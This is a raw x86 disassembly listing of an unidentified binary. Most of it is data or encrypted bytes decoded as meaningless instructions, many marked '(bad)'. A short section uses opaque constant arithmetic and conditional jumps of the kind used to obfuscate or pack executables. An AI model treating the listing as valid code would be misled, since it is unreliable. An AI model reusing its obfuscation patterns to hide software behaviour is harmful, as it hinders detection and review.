  40bbfc:	gs repz push 0x26
  40bc00:	aas    
  40bc01:	int3   
  40bc02:	mov    edi,0x5bbb3bda
  40bc07:	popf   
  40bc08:	retf   
  40bc09:	dec    esp
  40bc0a:	dec    ecx
  40bc0b:	out    0xc1,eax
  40bc0d:	cs in  al,0xc2
  40bc10:	mov    bl,0x64
  40bc12:	repnz adc BYTE PTR [ecx+0x1f],cl
  40bc16:	dec    edi
  40bc17:	sub    bh,BYTE PTR [edx+0x39a156bb]
  40bc1d:	add    bh,BYTE PTR [eax-0x1a]
  40bc20:	and    edi,ebx
  40bc22:	retf   0xa45e
  40bc25:	es pushf 
  40bc27:	scas   eax,DWORD PTR es:[edi]
  40bc28:	xor    DWORD PTR [ebp-0x39],esp
  40bc2b:	call   0xb68025a
  40bc30:	in     al,0xcf
  40bc32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc33:	daa    
  40bc34:	push   0x3037b8b5
  40bc39:	sub    edx,DWORD PTR [ebx]
  40bc3b:	fimul  DWORD PTR [esi-0x70]
  40bc3e:	and    esp,esi
  40bc40:	ror    BYTE PTR [ecx+0x12],cl
  40bc43:	nop
  40bc44:	sti    
  40bc45:	mov    ch,0x4c
  40bc47:	mov    eax,0x9a040f13
  40bc4c:	clc    
  40bc4d:	or     esp,DWORD PTR [esi+ebx*1-0x1e]
  40bc51:	mov    ebx,0xcabe7ea5
  40bc56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc57:	loop   0x40bc70
  40bc59:	jo     0x40bc9a
  40bc5b:	out    dx,al
  40bc5c:	mov    ebp,0x88345df5
  40bc61:	(bad)  
  40bc62:	call   FWORD PTR [edx-0x4f]
  40bc65:	cmp    ecx,DWORD PTR [eax]
  40bc67:	int3   
  40bc68:	in     al,0x89
  40bc6a:	and    BYTE PTR [esi-0x50],0xe
  40bc6e:	pop    esi
  40bc6f:	jno    0x40bce9
  40bc71:	cmp    BYTE PTR [edx+0x1b],cl
  40bc74:	scas   eax,DWORD PTR es:[edi]
  40bc75:	push   esi
  40bc76:	xchg   ecx,eax
  40bc77:	jp     0x40bc7b
  40bc79:	dec    edi
  40bc7a:	adc    edx,DWORD PTR [eax+0x58]
  40bc7d:	inc    esp
  40bc7e:	dec    ecx
  40bc7f:	mov    ds:0xefa8b857,eax
  40bc84:	mov    eax,ds:0x5bd064f1
  40bc89:	mov    bh,0xf8
  40bc8b:	or     BYTE PTR [ebx+0x72f44d76],0x8a
  40bc92:	mov    dh,0x75
  40bc94:	mov    cl,0xe0
  40bc96:	mov    edx,0xc7dd4a8e
  40bc9b:	add    DWORD PTR [ecx],0x7925f7ec
  40bca1:	test   BYTE PTR [esi-0x2d],dl
  40bca4:	cmp    ebx,DWORD PTR [edx+0x76]
  40bca7:	test   edx,edi
  40bca9:	test   eax,0xcd03461d
  40bcae:	imul   esi,DWORD PTR [edi-0x6a],0x66
  40bcb2:	pop    esp
  40bcb3:	add    BYTE PTR [ecx],ch
  40bcb5:	jmp    FWORD PTR [eax]
  40bcb7:	mov    DWORD PTR [esp+esi*2-0x37],ebp
  40bcbb:	lea    esi,[esi+0x5f]
  40bcbe:	xor    eax,0xcacfe9b3
  40bcc3:	inc    esp
  40bcc4:	cmp    al,BYTE PTR [ecx+0x5e]
  40bcc7:	imul   ebx,DWORD PTR [bp+0x3d55],0xa12a5ca8
  40bcd0:	sub    al,0x56
  40bcd2:	lock jge 0x40bc6f
  40bcd5:	push   dx
  40bcd7:	ret    0xfd01
  40bcda:	mov    bl,0xe9
  40bcdc:	das    
  40bcdd:	icebp  
  40bcde:	add    BYTE PTR [edx-0xb],bl
  40bce1:	repz out 0x57,al
  40bce4:	inc    edi
  40bce5:	xchg   esi,eax
  40bce6:	in     al,dx
  40bce7:	push   0x3dfa4ce3
  40bcec:	gs es in eax,dx
  40bcef:	loop   0x40bccf
  40bcf1:	test   DWORD PTR [ecx],ebp
  40bcf3:	rcr    DWORD PTR [ebx],cl
  40bcf5:	scas   al,BYTE PTR es:[edi]
  40bcf6:	imul   esp,edi,0xfffffff7
  40bcf9:	push   es
  40bcfa:	add    eax,0xa797c6e4
  40bcff:	(bad)  
  40bd00:	mov    WORD PTR [ebx],fs
  40bd02:	inc    eax
  40bd03:	lods   al,BYTE PTR ds:[esi]
  40bd04:	test   eax,0x46f67af0
  40bd09:	xor    eax,0x3a1f9691
  40bd0e:	rcl    DWORD PTR [ecx+0x7b9bf5e],cl
  40bd14:	xchg   edi,eax
  40bd15:	mov    cl,0x4e
  40bd17:	push   ebx
  40bd18:	jbe    0x40bd42
  40bd1a:	or     DWORD PTR [edx],esp
  40bd1c:	mov    ds:0x9adb8dbd,eax
  40bd21:	sub    eax,0x919195f4
  40bd26:	shl    DWORD PTR [esi+0x4b],cl
  40bd29:	add    ch,BYTE PTR [eax]
  40bd2b:	loope  0x40bd9e
  40bd2d:	pop    edi
  40bd2e:	aaa    
  40bd2f:	fldcw  WORD PTR [edi]
  40bd31:	sbb    DWORD PTR [esi],esi
  40bd33:	jle    0x40bcff
  40bd35:	mov    ebp,0x8fb3a28b
  40bd3a:	scas   al,BYTE PTR es:[edi]
  40bd3b:	(bad)  
  40bd3c:	outs   dx,BYTE PTR ds:[esi]
  40bd3d:	test   al,0x3d
  40bd3f:	pushf  
  40bd40:	mov    ds:0x69061432,eax
  40bd45:	pusha  
  40bd46:	cmp    eax,DWORD PTR [ecx]
  40bd48:	pop    ds
  40bd49:	and    BYTE PTR [ebx+0x42767d97],0x4a
  40bd50:	icebp  
  40bd51:	adc    DWORD PTR [esi],esp
  40bd53:	adc    DWORD PTR [ebp+0x10],esi
  40bd56:	mov    al,0xa7
  40bd59:	xchg   DWORD PTR [esi],ebp
  40bd5b:	sbb    eax,0xdaf33ddc
  40bd60:	jo     0x40bcfa
  40bd62:	xlat   BYTE PTR ds:[ebx]
  40bd63:	xor    DWORD PTR [edx-0x4a8b15a8],esp
  40bd69:	in     eax,0x5b
  40bd6b:	xor    bh,BYTE PTR ds:0xfdf276f8
  40bd71:	neg    BYTE PTR [eax-0x846a8ec]
  40bd77:	jb     0x40bdeb
  40bd79:	inc    edi
  40bd7a:	(bad)  
  40bd7b:	jb     0x40bd5e
  40bd7d:	rol    ch,1
  40bd7f:	test   BYTE PTR [esi],bh
  40bd81:	fnstcw WORD PTR [ebx-0x172fd040]
  40bd87:	dec    esp
  40bd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd89:	cwde   
  40bd8a:	inc    ebx
  40bd8b:	sub    eax,0xee22dc55
  40bd90:	outs   dx,DWORD PTR ds:[esi]
  40bd91:	adc    al,0xf2
  40bd93:	and    al,0xf7
  40bd95:	adc    ecx,DWORD PTR [edi]
  40bd97:	out    0x62,eax
  40bd99:	lds    ebp,FWORD PTR [edx]
  40bd9b:	js     0x40bd62
  40bd9d:	imul   edx,edi,0xa984aa0b
  40bda3:	std    
  40bda4:	xchg   esi,eax
  40bda5:	xor    cl,BYTE PTR [ebx+0x5774370c]
  40bdab:	gs dec ebp
  40bdad:	pop    esi
  40bdae:	adc    eax,0x55817f83
  40bdb3:	jl     0x40bd3f
  40bdb5:	lods   eax,DWORD PTR ds:[esi]
  40bdb6:	pop    edx
  40bdb7:	hlt    
  40bdb8:	mov    dh,0xfe
  40bdba:	or     bh,bh
  40bdbc:	nop    DWORD PTR [ecx*8+0x1c4c4a9e]
  40bdc4:	sbb    al,0xec
  40bdc6:	push   edx
  40bdc7:	neg    BYTE PTR [edi-0x32f9c3b6]
  40bdcd:	fsin   
  40bdcf:	out    dx,al
  40bdd0:	and    BYTE PTR [edi+eax*8+0x5756ee90],cl
  40bdd7:	jmp    FWORD PTR [edx+0x3e]
  40bdda:	mov    ds:0x33d2cc4d,eax
  40bddf:	sub    bh,dl
  40bde1:	xor    ch,BYTE PTR [edx]
  40bde3:	psubq  mm1,QWORD PTR [eax-0x506dd63e]
  40bdea:	scas   al,BYTE PTR es:[edi]
  40bdeb:	fadd   QWORD PTR [esi-0x9]
  40bdee:	xchg   DWORD PTR [edx+0x973abd9],esp
  40bdf4:	iret   
  40bdf5:	inc    esp
  40bdf6:	or     BYTE PTR [edx-0x27],ch
  40bdf9:	enter  0xa7f6,0x87
  40bdfd:	pop    eax
  40bdfe:	push   edi
  40bdff:	sub    DWORD PTR [esi],0xf8d2bd12
  40be05:	sar    BYTE PTR [ebp+eax*8+0x44],1
  40be09:	inc    DWORD PTR [edx]
  40be0b:	int    0x97
  40be0d:	in     eax,0x5f
  40be0f:	mov    ch,0xc3
  40be11:	add    eax,0x1a95906b
  40be16:	(bad)  
  40be17:	(bad)  
  40be18:	pusha  
  40be19:	sub    cl,BYTE PTR [bp-0x5d05]
  40be1e:	mov    edi,0x59190a4
  40be23:	test   dh,bh
  40be25:	sbb    al,0x88
  40be27:	outs   dx,BYTE PTR ds:[esi]
  40be28:	xor    dl,BYTE PTR [eax-0x10ac928]
  40be2e:	clc    
  40be2f:	rcr    al,0xd
  40be32:	imul   esp,ebx,0x52
  40be35:	adc    al,0x6c
  40be37:	mov    eax,ds:0x61a8d818
  40be3c:	mov    cs,WORD PTR ds:0xefc97a88
  40be42:	dec    edi
  40be43:	cmp    al,0x4
  40be45:	push   ss
  40be46:	fdiv   DWORD PTR [esi]
  40be48:	hlt    
  40be49:	dec    ebp
  40be4a:	outs   dx,DWORD PTR ds:[esi]
  40be4b:	aad    0x7d
  40be4d:	jbe    0x40be4b
  40be4f:	jns    0x40be73
  40be51:	sbb    al,0xa1
  40be53:	dec    esi
  40be54:	adc    al,dh
  40be56:	mov    al,0x3d
  40be58:	mov    esi,0xbc6eb03f
  40be5d:	inc    ebp
  40be5e:	in     eax,0x4f
  40be60:	push   0x4f
  40be62:	mov    al,ds:0xf9da184e
  40be67:	popa   
  40be68:	adc    DWORD PTR [ebx],edi
  40be6a:	mov    edx,edi
  40be6c:	pop    ebp
  40be6d:	and    al,0x75
  40be6f:	lods   eax,DWORD PTR ds:[esi]
  40be70:	in     al,dx
  40be71:	lods   eax,DWORD PTR ds:[esi]
  40be72:	loope  0x40be31
  40be74:	mov    dh,0x48
  40be76:	test   DWORD PTR [ecx-0x3e7a0b60],ecx
  40be7c:	pop    eax
  40be7d:	mov    BYTE PTR [ecx],bh
  40be7f:	mov    BYTE PTR [edx+0x15],cl
  40be82:	inc    ecx
  40be83:	cmc    
  40be84:	repz bound ebx,QWORD PTR ss:0xc7f44d89
  40be8c:	inc    ebp
  40be8d:	loopne 0x40bedf
  40be8f:	dec    edx
  40be90:	add    BYTE PTR [eax],al
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf0e
  40bf55:	xor    edi,ecx
  40bf57:	jo     0x40bf0f
  40bf59:	add    eax,0x126e1818
  40bf5e:	sbb    BYTE PTR [eax],bl
  40bf60:	aas    
  40bf61:	jge    0x40bf56
  40bf63:	xor    BYTE PTR [edx],dl
  40bf65:	ins    DWORD PTR es:[edi],dx
  40bf66:	int3   
  40bf67:	and    dl,BYTE PTR [ebp+0x64]
  40bf6a:	outs   dx,DWORD PTR ds:[esi]
  40bf6b:	and    eax,DWORD PTR ds:0xde9bfda9
  40bf71:	xchg   esi,eax
  40bf72:	out    0x4d,eax
  40bf74:	repnz mov eax,0xb6fb7363
  40bf7a:	push   edx
  40bf7b:	sbb    esp,DWORD PTR [esi-0x78d913e1]
  40bf81:	ret    0x2978
  40bf84:	cwde   
  40bf85:	mov    ds:0x9792a16a,al
  40bf8a:	aaa    
  40bf8b:	pop    edx
  40bf8c:	cmp    BYTE PTR [ecx],0x64
  40bf8f:	in     eax,0x95
  40bf91:	pop    DWORD PTR [ebp-0x2a13f93d]
  40bf97:	xchg   edi,eax
  40bf98:	dec    eax
  40bf99:	call   0x70827b3
  40bf9e:	mov    ecx,0xe5f67f04
  40bfa3:	mov    al,ds:0xf14828ad
  40bfa8:	adc    ch,dh
  40bfaa:	inc    esp
  40bfab:	xchg   BYTE PTR [edx+0x6],dh
  40bfae:	sbb    al,0xac
  40bfb0:	mov    al,0x1a
  40bfb2:	sbb    esp,DWORD PTR [edi+0x42]
  40bfb5:	push   ebp
  40bfb6:	sub    BYTE PTR [ebx-0x55],0x80
  40bfba:	jnp    0x40c012
  40bfbc:	sbb    al,0xa4
  40bfbe:	pop    es
  40bfbf:	shr    esi,0x5f
  40bfc2:	arpl   WORD PTR [ecx-0x5b],bp
  40bfc5:	clc    
  40bfc6:	hlt    
  40bfc7:	mov    ebp,0xc4d18639
  40bfcc:	cmp    ebp,esp
  40bfce:	mov    ch,0x92
  40bfd0:	inc    eax
  40bfd1:	push   esp
  40bfd2:	aas    
  40bfd3:	jmp    esp
  40bfd5:	xor    edx,DWORD PTR [edi]
  40bfd7:	add    DWORD PTR [esi],esp
  40bfd9:	and    eax,0x2ba45d12
  40bfde:	mov    al,al
  40bfe0:	mov    ds:0xa4589069,al
  40bfe5:	add    eax,0xe80d3f4
  40bfea:	(bad)  
  40bfeb:	out    0xbc,eax
  40bfed:	(bad)  
  40bfee:	jecxz  0x40bff7
  40bff0:	cmp    BYTE PTR [ebp+0x46],cl
  40bff3:	adc    eax,0xf4886eda
  40bff8:	jmp    0xda9c:0xeb095d4d
  40bfff:	(bad)  
  40c000:	data16 lods al,BYTE PTR ds:[esi]
  40c002:	or     eax,DWORD PTR [edi+0x7465769d]
  40c008:	push   esp
  40c009:	ds push esp
  40c00b:	out    dx,eax
  40c00c:	ins    BYTE PTR es:[edi],dx
  40c00d:	ins    BYTE PTR es:[edi],dx
  40c00e:	mov    ebx,edi
  40c010:	nop
  40c011:	js     0x40c043
  40c013:	call   0xffb9d09
  40c018:	jae    0x40c07f
  40c01a:	fadd   st,st(3)
  40c01c:	ror    BYTE PTR [eax+0x19],1
  40c01f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c020:	jbe    0x40bffb
  40c022:	mov    dl,0x43
  40c024:	jne    0x40c039
  40c026:	mov    bh,0xa2
  40c028:	(bad)  
  40c02a:	sbb    ebp,edi
  40c02c:	stc    
  40c02d:	xor    cl,BYTE PTR [eax]
  40c02f:	stos   BYTE PTR es:[edi],al
  40c030:	mov    edi,0x8884eb4a
  40c035:	xor    ebp,DWORD PTR [eax-0x48]
  40c038:	jmp    0x40c02e
  40c03a:	inc    eax
  40c03b:	xchg   edi,eax
  40c03c:	mov    bl,0xa
  40c03e:	inc    ebx
  40c03f:	jo     0x40c0b7
  40c041:	ror    ebp,0xd8
  40c044:	cmp    ecx,DWORD PTR [eax-0x1c]
  40c047:	mov    al,0x46
  40c049:	jb     0x40bfd7
  40c04b:	xchg   ebx,eax
  40c04c:	xlat   BYTE PTR ds:[ebx]
  40c04d:	sub    esi,esp
  40c04f:	aad    0x87
  40c051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c052:	sub    al,0xfd
  40c054:	pop    ebp
  40c055:	pop    ecx
  40c056:	mov    dl,0x21
  40c058:	or     BYTE PTR [edi-0x4fbec10e],0x81
  40c05f:	std    
  40c060:	rol    DWORD PTR [edx],0x7
  40c063:	test   al,0xa0
  40c065:	jnp    0x40bfe7
  40c067:	sbb    eax,0x38cf8b41
  40c06c:	add    eax,0xd79e1db2
  40c071:	popf   
  40c072:	inc    ebx
  40c073:	dec    edx
  40c074:	or     cl,BYTE PTR [edx-0x23d66e64]
  40c07a:	aaa    
  40c07b:	nop
  40c07c:	clc    
  40c07d:	enter  0xea94,0x81
  40c081:	xchg   BYTE PTR [ebx],dl
  40c083:	sub    BYTE PTR [ecx-0x6d],al
  40c086:	push   0xd
  40c088:	ins    DWORD PTR es:[edi],dx
  40c089:	aad    0x82
  40c08b:	or     ebx,0xc117d2b7
  40c091:	mov    ch,0x23
  40c093:	jne    0x40c021
  40c095:	into   
  40c096:	pop    esp
  40c097:	ins    DWORD PTR es:[edi],dx
  40c098:	mov    edx,0xc9bb87d4
  40c09d:	jp     0x40c027
  40c09f:	ds out 0x93,eax
  40c0a2:	mov    ds:0xa5dd462f,al
  40c0a7:	push   eax
  40c0a8:	mov    bh,0xe
  40c0aa:	pusha  
  40c0ab:	hlt    
  40c0ac:	mov    BYTE PTR [ebp+eax*1+0xfe5ad46],dl
  40c0b3:	pop    edx
  40c0b4:	test   BYTE PTR [ebp-0x797a0c7],dh
  40c0ba:	repnz test al,dh
  40c0bd:	pop    edx
  40c0be:	or     esp,DWORD PTR [esi]
  40c0c0:	addr16 cmp eax,0xe980d87f
  40c0c6:	and    BYTE PTR [ecx+0x61068687],dl
  40c0cc:	mov    bl,0x37
  40c0ce:	lock ss and eax,0xa3a50944
  40c0d5:	nop
  40c0d6:	jne    0x40c109
  40c0d8:	repnz fcom DWORD PTR [edx+0x6cb28609]
  40c0df:	jl     0x40c0df
  40c0e1:	cli    
  40c0e2:	and    eax,0xfd4d8f47
  40c0e7:	das    
  40c0e8:	ss xor al,0x71
  40c0eb:	and    BYTE PTR [eax-0x2e],0x70
  40c0ef:	jl     0x40c16d
  40c0f1:	mov    edi,0xb77c893
  40c0f6:	pop    edi
  40c0f7:	pusha  
  40c0f8:	jp     0x40c155
  40c0fa:	jns    0x40c101
  40c0fc:	lahf   
  40c0fd:	cmp    eax,0xe38bd318
  40c102:	sub    eax,0x7dfbec71
  40c107:	jmp    0x40c17d
  40c109:	test   al,0x4e
  40c10b:	sub    edx,DWORD PTR [ebp-0x7a]
  40c10e:	ss enter 0xf62a,0x76
  40c113:	popf   
  40c114:	xchg   dl,bl
  40c116:	call   0x428e44ac
  40c11b:	jmp    0x8a52102
  40c120:	hlt    
  40c121:	push   cs
  40c122:	lods   al,BYTE PTR ds:[esi]
  40c123:	xchg   ecx,eax
  40c124:	sti    
  40c125:	in     eax,dx
  40c126:	xchg   BYTE PTR [ecx-0x1],bl
  40c129:	push   ss
  40c12a:	dec    esp
  40c12b:	repz fs push eax
  40c12e:	int3   
  40c12f:	xor    al,0x9c
  40c131:	test   esi,eax
  40c133:	jmp    0x3b:0x7912d19d
  40c13a:	mov    ebx,0x8ffaa987
  40c13f:	in     eax,0x8
  40c141:	stos   DWORD PTR es:[edi],eax
  40c142:	sbb    bl,BYTE PTR [ebx+0x19]
  40c145:	push   ebx
  40c146:	fwait
  40c147:	cmp    BYTE PTR [eax-0x5ec830e3],bh
  40c14d:	cmp    BYTE PTR [edx-0x17],ch
  40c150:	push   0xffffff87
  40c152:	pop    ebp
  40c153:	fs das 
  40c155:	adc    eax,DWORD PTR [edx+eiz*4+0x2acd45df]
  40c15c:	int3   
  40c15d:	adc    ebp,0x20
  40c160:	mov    ch,0xfc
  40c162:	push   cs
  40c163:	inc    edx
  40c164:	xor    eax,0x2e513459
  40c169:	mov    dl,0x6d
  40c16b:	xchg   dh,dl
  40c16d:	fsub   st(6),st
  40c16f:	mov    edx,0x4072f17e
  40c174:	(bad)  
  40c175:	shl    DWORD PTR [eax+0x1d],1
  40c178:	push   ebp
  40c179:	mov    BYTE PTR [edi],ch
  40c17b:	retf   
  40c17c:	xchg   esp,eax
  40c17d:	mov    edi,0x3ded40ee
  40c182:	push   ecx
  40c183:	rcl    DWORD PTR [esi+0x2d],cl
  40c186:	push   es
  40c187:	mov    eax,ds:0xc0badfba
  40c18c:	adc    ebp,DWORD PTR [esi+0x71b60425]
  40c192:	dec    edx
  40c193:	or     dl,BYTE PTR [eax]
  40c195:	ret    0x71d5
  40c198:	dec    DWORD PTR [ecx+0x7d]
  40c19b:	cld    
  40c19c:	push   0xe3a32c2
  40c1a1:	inc    eax
  40c1a2:	pusha  
  40c1a3:	rcr    DWORD PTR [eax+0x6],0x66
  40c1a7:	out    dx,al
  40c1a8:	cmp    eax,0xa0ae3d6a
  40c1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ae:	aas    
  40c1af:	ins    DWORD PTR es:[edi],dx
  40c1b0:	ret    
  40c1b1:	test   ah,cl
  40c1b3:	int3   
  40c1b4:	inc    edx
  40c1b5:	mov    ah,BYTE PTR [esi+0x2b6ad822]
  40c1bb:	sbb    ch,BYTE PTR [edx+0x8]
  40c1be:	inc    edi
  40c1bf:	mov    al,0x81
  40c1c1:	jp     0x40c207
  40c1c3:	add    dh,BYTE PTR [ecx]
  40c1c5:	xchg   DWORD PTR [esi+0x78ecba5e],eax
  40c1cb:	das    
  40c1cc:	mov    ebp,0xd1f0fbc
  40c1d1:	test   eax,0x5ddf0b02
  40c1d6:	enter  0x3201,0xbd
  40c1da:	mov    dh,0x20
  40c1dc:	mov    ebx,0x7fe14534
  40c1e1:	inc    ebx
  40c1e2:	sbb    cl,bl
  40c1e4:	stos   DWORD PTR es:[edi],eax
  40c1e5:	push   ecx
  40c1e6:	sahf   
  40c1e7:	aaa    
  40c1e8:	pop    es
  40c1e9:	loopne 0x40c22b
  40c1eb:	or     eax,0x9d82cb1f
  40c1f0:	mov    bh,0x90
  40c1f2:	ss addr16 pop esp
  40c1f5:	lds    ebx,FWORD PTR es:[esi+0x56a67f2b]
  40c1fc:	das    
  40c1fd:	push   esi
  40c1fe:	mov    edx,0x82529144
  40c203:	cld    
  40c204:	icebp  
  40c205:	sub    esi,eax
  40c207:	cmp    esp,esi
  40c209:	xchg   ebx,eax
  40c20a:	or     eax,0x31aa78f3
  40c20f:	mov    edx,esp
  40c211:	repnz stc 
  40c213:	daa    
  40c214:	mov    esp,0x1c2d847c
  40c219:	cmp    ecx,ebx
  40c21b:	mov    esi,0x31b380e6
  40c220:	(bad)  
  40c221:	(bad)  
  40c222:	jmp    0x40c1ad
  40c224:	or     eax,0x2d0b239e
  40c229:	cmc    
  40c22a:	cmp    eax,0x6e572db2
  40c22f:	adc    DWORD PTR [eax+ebx*2+0x3a],esi
  40c233:	adc    eax,0x6ff7d8d4
  40c238:	hlt    
  40c239:	mov    ch,0x2f
  40c23b:	stos   DWORD PTR es:[edi],eax
  40c23c:	or     BYTE PTR [esi],bl
  40c23e:	lock gs rcr al,cl
  40c242:	not    DWORD PTR ds:0x20c600b6
  40c248:	je     0x40c1e1
  40c24a:	inc    ecx
  40c24b:	xchg   edx,eax
  40c24c:	mov    BYTE PTR [eax],al
  40c24e:	dec    BYTE PTR [ebx-0x7d99eb2e]
  40c254:	inc    edx
  40c255:	or     eax,0xb9b6a67e
  40c25a:	je     0x40c276
  40c25c:	push   edi
  40c25d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c25e:	lods   al,BYTE PTR ds:[esi]
  40c25f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c260:	pushf  
  40c261:	cmc    
  40c262:	sbb    al,0xc8
  40c264:	(bad)  
  40c266:	pop    ebx
  40c267:	mov    eax,ds:0x1f9770fb
  40c26c:	mov    ds:0xebe90469,al
  40c271:	call   0x46f4:0xccea6ead
  40c278:	in     al,dx
  40c279:	lahf   
  40c27a:	cmp    al,0x80
  40c27c:	dec    esp
  40c27d:	retf   
  40c27e:	out    0x92,al
  40c280:	mov    BYTE PTR [edi+0x7d30537e],cl
  40c286:	retf   0x3607
  40c289:	push   ebx
  40c28a:	out    dx,al
  40c28b:	xchg   edi,eax
  40c28c:	push   ss
  40c28d:	ins    BYTE PTR es:[edi],dx
  40c28e:	dec    ecx
  40c28f:	inc    esi
  40c290:	scas   eax,DWORD PTR es:[di]
  40c292:	lods   al,BYTE PTR ds:[esi]
  40c293:	(bad)  
  40c294:	ror    esi,1
  40c296:	push   edx
  40c297:	add    ch,BYTE PTR [edi+eax*1-0x19]
  40c29b:	fnstsw WORD PTR [ecx+0x20]
  40c29e:	sub    eax,edi
  40c2a0:	js     0x40c2ad
  40c2a2:	mov    esp,DWORD PTR [ebp-0xf]
  40c2a5:	pop    ebx
  40c2a6:	pop    edx
  40c2a7:	push   ebx
  40c2a8:	add    bh,BYTE PTR [esi]
  40c2aa:	jne    0x40c31e
  40c2ac:	loopne 0x40c2b5
  40c2ae:	sub    al,BYTE PTR [ebx+0x5e]
  40c2b1:	xchg   BYTE PTR [eax],bh
  40c2b3:	out    0x1c,eax
  40c2b5:	loopne 0x40c2d4
  40c2b7:	sahf   
  40c2b8:	and    BYTE PTR cs:[esi],cl
  40c2bb:	xchg   edi,eax
  40c2bc:	aas    
  40c2bd:	push   0xffffffbf
  40c2bf:	adc    ebp,0x36741363
  40c2c5:	push   0xf19c910c
  40c2ca:	pop    esi
  40c2cb:	push   es
  40c2cc:	jne    0x40c256
  40c2ce:	adc    bh,cl
  40c2d0:	dec    edx
  40c2d1:	mov    edi,0x2912b2e
  40c2d6:	mov    al,ds:0xf9400219
  40c2db:	push   ds
  40c2dc:	shr    edi,0xa4
  40c2df:	cmc    
  40c2e0:	ret    
  40c2e1:	in     eax,dx
  40c2e2:	mov    ds:0xb6c69dc0,al
  40c2e7:	lock mov cl,0x95
  40c2ea:	xchg   edi,eax
  40c2eb:	in     al,0xd1
  40c2ed:	dec    esp
  40c2ee:	xchg   BYTE PTR [edx-0x4],bh
  40c2f1:	pop    esp
  40c2f2:	adc    eax,0x3ca73933
  40c2f7:	pop    ebx
  40c2f8:	in     al,dx
  40c2f9:	call   0x6452:0x37c7112f
  40c300:	sbb    eax,ebx
  40c302:	jbe    0x40c29b
  40c304:	sbb    edi,0x50e8a842
  40c30a:	test   al,0x15
  40c30c:	ret    
  40c30d:	mov    ss,esp
  40c30f:	xor    al,0xf6
  40c311:	out    0x19,al
  40c313:	pop    esp
  40c314:	cmp    BYTE PTR [esi+ebp*2-0x5f6c9a68],ah
  40c31b:	add    cl,BYTE PTR [edi]
  40c31d:	push   cs
  40c31e:	xchg   esp,eax
  40c31f:	xchg   esi,eax
  40c320:	add    ecx,ecx
  40c322:	jns    0x40c2d4
  40c324:	pop    edx
  40c325:	or     dl,ah
  40c327:	mov    edx,0xf1c5eef
  40c32c:	loopne 0x40c2f0
  40c32e:	pop    esi
  40c32f:	pop    es
  40c330:	test   DWORD PTR [edi+0x1f],0x3e0f9e82
  40c337:	sti    
  40c338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c339:	push   eax
  40c33a:	call   0x416c20
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42276c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422558
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42276c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
